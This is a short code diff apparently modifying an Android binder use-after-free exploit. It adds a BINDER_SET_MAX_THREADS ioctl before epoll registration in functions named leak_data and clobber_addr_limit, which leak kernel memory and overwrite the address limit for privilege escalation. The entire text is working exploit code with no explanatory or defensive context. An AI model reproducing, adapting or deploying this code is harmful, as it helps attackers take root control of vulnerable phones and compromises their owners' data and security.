@@ -36,6 +36,7 @@
 #define MIN(x,y) ((x)<(y) ? (x) : (y))
 #define MAX(x,y) ((x)>(y) ? (x) : (y))
 
+#define BINDER_SET_MAX_THREADS 0x40046205ul
 #define BINDER_THREAD_EXIT 0x40046208ul
 // NOTE: we don't cover the task_struct* here; we want to leave it uninitialized
 #define BINDER_THREAD_SZ 0x188
@@ -87,6 +88,9 @@ void leak_data(void* leakBuffer, int leakAmount)
   if (dataBuffer == NULL) err(1, "allocating dataBuffer");
   memset(dataBuffer, 0, dataBufferSize);
   struct epoll_event event = { .events = EPOLLIN };
+
+  int max_threads = 2;  
+  ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
   if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");
 
   struct iovec iovec_array[IOVEC_ARRAY_SZ];
@@ -170,6 +174,8 @@ void clobber_addr_limit(void)
   memset(uafFill, 0xC4, UAF_SPINLOCK);
     
   struct epoll_event event = { .events = EPOLLIN };
+  int max_threads = 2;  
+  ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
   if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");
 
   unsigned long testDatum = 12;
